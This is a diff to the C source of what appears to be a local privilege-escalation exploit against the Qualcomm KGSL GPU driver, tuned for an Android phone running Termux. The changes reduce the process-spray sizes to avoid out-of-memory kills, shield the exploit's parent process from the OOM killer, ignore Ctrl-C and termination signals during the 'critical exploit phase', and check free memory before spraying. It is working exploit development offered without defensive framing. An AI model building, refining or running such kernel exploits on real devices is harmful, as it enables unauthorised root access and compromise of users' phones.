@@ -214,9 +214,13 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 1
-#define SPRAY_COUNT 40000
-#define SPRAY_COUNT_STEP 100
-#define SPRAY_COUNT_MAX 80000
+// SPRAY_COUNT: how many processes to spray per window
+// Reduced from 40000 to prevent OOM kills on Termux (each process ~ 4MB stack+page tables)
+// Each process needs ~4-8MB virtual address space, so 2000 = ~8-16GB mapped
+// On ROG 5S with 12GB RAM, this is safe; with 8GB it might OOM, hence the new check
+#define SPRAY_COUNT 2000
+#define SPRAY_COUNT_STEP 50
+#define SPRAY_COUNT_MAX 4000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -2656,6 +2660,57 @@ int main(int argc, char **argv)
     setrlimit(RLIMIT_NPROC, &rl);
     rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;
     setrlimit(RLIMIT_MEMLOCK, &rl);
+
+    // CRITICAL: Protect PARENT from OOM killer.
+    // Without this, the parent is killed by OOM when 8000+ child processes
+    // consume too much RAM. With oom_score_adj=-1000, OOM killer will
+    // ALWAYS choose the spray processes first, not the parent.
+    {
+        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
+        if (oom_fd >= 0) {
+            if (write(oom_fd, "-1000", 5) < 0) {
+                // Try with root uid path
+            }
+            close(oom_fd);
+            fprintf(stderr, "[*] Parent oom_score_adj set to -1000 (protected from OOM)\n");
+        } else {
+            fprintf(stderr, "[!] Warning: Could not set oom_score_adj (errno=%d)\n", errno);
+        }
+
+        // Also protect via oom_score (some kernels use this instead)
+        int score_fd = open("/proc/self/oom_score", O_WRONLY);
+        if (score_fd >= 0) {
+            // Can't write to oom_score (read-only), but oom_score_adj is enough
+            close(score_fd);
+        }
+    }
+
+    // Install signal handlers for graceful shutdown
+    signal(SIGINT, SIG_IGN);   // Ignore Ctrl-C during critical exploit phase
+    signal(SIGTERM, SIG_IGN);  // Ignore SIGTERM during critical exploit phase
+    // SIGKILL (9) cannot be caught - that's the OOM killer
+
+    // Check available memory before starting heavy spray
+    {
+        FILE *meminfo = fopen("/proc/meminfo", "r");
+        if (meminfo) {
+            long mem_avail_kb = 0, mem_total_kb = 0;
+            char line[256];
+            while (fgets(line, sizeof(line), meminfo)) {
+                if (strncmp(line, "MemAvailable:", 13) == 0)
+                    sscanf(line + 13, "%ld", &mem_avail_kb);
+                if (strncmp(line, "MemTotal:", 9) == 0)
+                    sscanf(line + 9, "%ld", &mem_total_kb);
+            }
+            fclose(meminfo);
+            fprintf(stderr, "[*] System: %ld MB total, %ld MB available\n",
+                    mem_total_kb / 1024, mem_avail_kb / 1024);
+            // If less than 2GB available, warn
+            if (mem_avail_kb < 2 * 1024 * 1024) {
+                fprintf(stderr, "[!] WARNING: Less than 2GB available! Exploit may OOM-kill itself.\n");
+            }
+        }
+    }
 
     gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
